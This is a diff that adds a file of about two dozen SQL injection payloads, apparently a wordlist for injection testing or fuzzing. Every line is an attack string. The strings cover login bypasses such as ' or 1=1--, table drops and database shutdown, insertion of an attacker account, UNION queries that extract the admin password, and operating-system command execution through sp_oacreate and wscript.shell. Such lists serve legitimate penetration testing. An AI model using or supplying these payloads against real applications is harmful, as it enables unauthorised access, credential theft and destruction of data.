@@ -1,0 +1,28 @@
+jo'; drop table authors --
+ admin'-- 
+' or 1=1--
+' union select 1 , 'fictional_user' , 'some_password' , 1 --
+' having 1=1--
+' group by users.id having 1=1 --
+' group by users.id, users.username, users.password, users.privs having 1=1--
+' union select sum(username) from users--
+' union select sum(id) from users--
+'; insert into users values( 666, 'attacker', 'foobar', 0xffff )--
+' union select @@version,1,1,1--
+' union select min(username),1,1,1 from users where username > 'a'--
+' union select min(username),1,1,1 from users where username > 'admin'--
+' union select password,1,1,1 from users where username = 'admin'--
+' union select ret,1,1,1 from foo--
+'; drop table foo--
+'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'--
+admin'--
+';shutdown--
+admin'--sp_password
+x' AND email IS NULL; --
+abstract' AND userid IS NULL; --
+zone' AND 1=(SELECT COUNT(*) FROM tabname); --
+anaconda' AND members.email IS NULL; --
+big' OR full_name LIKE '%Bob%
+bob@example.com' AND passwd = 'hello123
+\''; DROP TABLE users; --
+x';INSERT INTO members ('email','passwd','login_id','full_name') VALUES ('steve@unixwiz.net','hello','steve','Steve Friedl');--
